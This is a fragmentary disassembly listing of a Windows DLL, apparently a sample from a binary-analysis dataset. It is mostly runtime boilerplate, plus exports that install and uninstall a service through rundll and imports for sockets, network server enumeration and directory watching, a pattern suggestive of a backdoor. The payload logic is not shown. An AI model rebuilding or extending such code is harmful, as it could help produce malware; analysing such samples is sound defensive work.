call ?terminate@@YAXXZ
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_710062d9
retn 0x10
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_710069d3
push 0xc
push r--data
call sub_71006294
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71006a1e
call sub_710062d9
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_71006a42
push 0x14
push r--data
call sub_71006294
push [ rw-data ]
mov esi [ _decode_pointer@IAT ]
call esi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call __dllonexit
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
mov esi [ _encode_pointer@IAT ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
add esp 0x1c
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71006ad8
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_710062d9
retn
sub_71006af3
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_71006b17
push esi
push edi
mov eax r--data
mov edi r--data
cmp eax edi
mov esi eax
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
add esi 0x4
cmp esi edi
jb r-xdata
call eax
sub_71006b40
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_71006b70
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_71006bb2
push 0x8
push r--data
call sub_71006294
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_71006b40
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_71006b70
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_710062d9
retn
sub_71006c36
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
cmp eax edi
mov ebx 0xffff0000
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_710022c0
mov eax [ ebp - 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax r-xdata
retn
cmp [ eax ] bl
je r-xdata
call [ GetLastError@IAT ]
RundllInstallA
push [ esp + 0xc ]
call InstallService
pop ecx
retn 0x10
sub_71003a16
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
xor eax eax
inc eax
retn
RundllUninstallA
push [ esp + 0xc ]
call UninstallService
pop ecx
retn 0x10
sub_71006270
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_710067ad
retn
memset
jmp [ memset@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
sub_710062d9
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_710062ed
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push sub_71006270
push rw-data
call _except_handler4_common
add esp 0x18
retn
sub_71006340
cmp [ rw-data ] 0x0
je sub_71006376
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
memcpy
jmp [ memcpy@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
??_U@YAPAXI@Z
jmp [ operator delete[]@IAT ]
??_V@YAXPAX@Z
jmp [ `placement delete closure'@IAT ]
sub_7100674d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x20 ] ecx
push eax
push ecx
call __CppXcptFilter
pop ecx
pop ecx
retn
sub_71006781
mov [ rw-data ] 0xffffffff
retn
_start
cmp [ esp + 0x8 ] 0x1
jne r-xdata
push [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
call sub_71006676
pop ecx
retn 0xc
call sub_71006c36
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
sub_710068b8
push 0xc
push r--data
call sub_71006294
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_710062d9
retn
sub_710068d5
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_71006968
call sub_71006908
mov [ rw-data ] eax
xor eax eax
retn
sub_71006a1e
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_71006975
sub_71006a36
push rw-data
call __clean_type_info_names_internal
pop ecx
retn
sub_71006ad8
push 0x8
call _unlock
pop ecx
retn
sub_71006ae1
push [ esp + 0x4 ]
call sub_71006a42
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_71006bf8
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
__CppXcptFilter
jmp [ __CppXcptFilter@IAT ]
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
?_type_info_dtor_internal_method@type_info@@QAEXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
__clean_type_info_names_internal
jmp [ __clean_type_info_names_internal@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
closesocket
jmp [ closesocket@IAT ]
shutdown
jmp [ shutdown@IAT ]
send
jmp [ send@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
select
jmp [ select@IAT ]
recv
jmp [ recv@IAT ]
connect
jmp [ connect@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
htons
jmp [ htons@IAT ]
socket
jmp [ socket@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
gethostname
jmp [ gethostname@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetServerEnum
jmp [ NetServerEnum@IAT ]
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
ReadDirectoryChangesW
jmp [ ReadDirectoryChangesW@IAT ]
sub_71006d66
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_71006270
mov ecx [ edx + 0x200 ]
xor ecx eax
call sub_71006270
mov eax r--data
jmp __CxxFrameHandler3
sub_71006d8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_71006270
mov ecx [ edx + 0x200 ]
xor ecx eax
call sub_71006270
mov eax r--data
jmp __CxxFrameHandler3
sub_71006db6
lea ecx [ ebp - 0x2654 ]
jmp sub_71001826
sub_71006dc1
lea ecx [ ebp - 0x2644 ]
jmp sub_71001826
sub_71006dcc
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2684 ]
mov ecx [ edx - 0x2688 ]
xor ecx eax
call sub_71006270
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_71006270
mov eax r--data
jmp __CxxFrameHandler3
